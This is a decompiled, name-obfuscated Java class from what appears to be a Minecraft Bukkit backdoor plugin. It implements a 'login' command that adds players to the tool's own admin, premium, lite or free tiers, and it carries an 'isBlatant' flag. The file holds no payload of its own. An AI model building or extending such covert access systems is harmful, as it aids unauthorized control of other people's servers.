/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LoginCommand
extends Command {
    public LoginCommand() {
        LoginCommand llllllllllllllIIIIlIlIlllIIlllll;
    }

    @Override
    public void execute(Core llllllllllllllIIIIlIlIlllIIlIIll, String llllllllllllllIIIIlIlIlllIIlIllI, String[] llllllllllllllIIIIlIlIlllIIlIlIl, Player llllllllllllllIIIIlIlIlllIIlIlII) {
        if (llllllllllllllIIIIlIlIlllIIlIIll.admin.contains(llllllllllllllIIIIlIlIlllIIlIlII.getName())) {
            if (llllllllllllllIIIIlIlIlllIIlIlIl.length <= 2) {
                llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.USAGE("login <player> <rank>"));
            } else {
                Player llllllllllllllIIIIlIlIlllIIllIIl = Bukkit.getServer().getPlayer(llllllllllllllIIIIlIlIlllIIlIlIl[1]);
                if (llllllllllllllIIIIlIlIlllIIllIIl == null) {
                    llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIlIlIlllIIlIlIl[1]).append(Settings.WHITE).append(" is not online."))));
                } else if (llllllllllllllIIIIlIlIlllIIlIIll.lite.contains(llllllllllllllIIIIlIlIlllIIllIIl.getName())) {
                    llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX("This player is already logged in"));
                } else {
                    if (llllllllllllllIIIIlIlIlllIIlIlIl[2].equalsIgnoreCase("admin")) {
                        llllllllllllllIIIIlIlIlllIIlIIll.lite.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIIll.premium.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIIll.admin.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIlIlIlllIIllIIl.getName()).append(Settings.WHITE).append(" has been logged into ").append(Settings.RED).append(Settings.NAME).append(" admin"))));
                    } else if (llllllllllllllIIIIlIlIlllIIlIlIl[2].equalsIgnoreCase("premium")) {
                        llllllllllllllIIIIlIlIlllIIlIIll.lite.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIIll.premium.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIlIlIlllIIllIIl.getName()).append(Settings.WHITE).append(" has been logged into ").append(Settings.RED).append(Settings.NAME).append(" premium"))));
                    } else if (llllllllllllllIIIIlIlIlllIIlIlIl[2].equalsIgnoreCase("lite")) {
                        llllllllllllllIIIIlIlIlllIIlIIll.lite.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIlIlIlllIIllIIl.getName()).append(Settings.WHITE).append(" has been logged into ").append(Settings.RED).append(Settings.NAME).append(" lite"))));
                    } else {
                        llllllllllllllIIIIlIlIlllIIlIIll.lite.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIIll.free.add(llllllllllllllIIIIlIlIlllIIllIIl.getName());
                        llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIIIlIlIlllIIllIIl.getName()).append(Settings.WHITE).append(" has been logged into ").append(Settings.RED).append(Settings.NAME).append(" free"))));
                    }
                    llllllllllllllIIIIlIlIlllIIllIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You have been logged into ").append(Settings.RED).append(Settings.NAME).append(" ").append(llllllllllllllIIIIlIlIlllIIlIlIl[2].toLowerCase()).append(Settings.WHITE).append(" by an admin"))));
                }
            }
        } else {
            llllllllllllllIIIIlIlIlllIIlIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

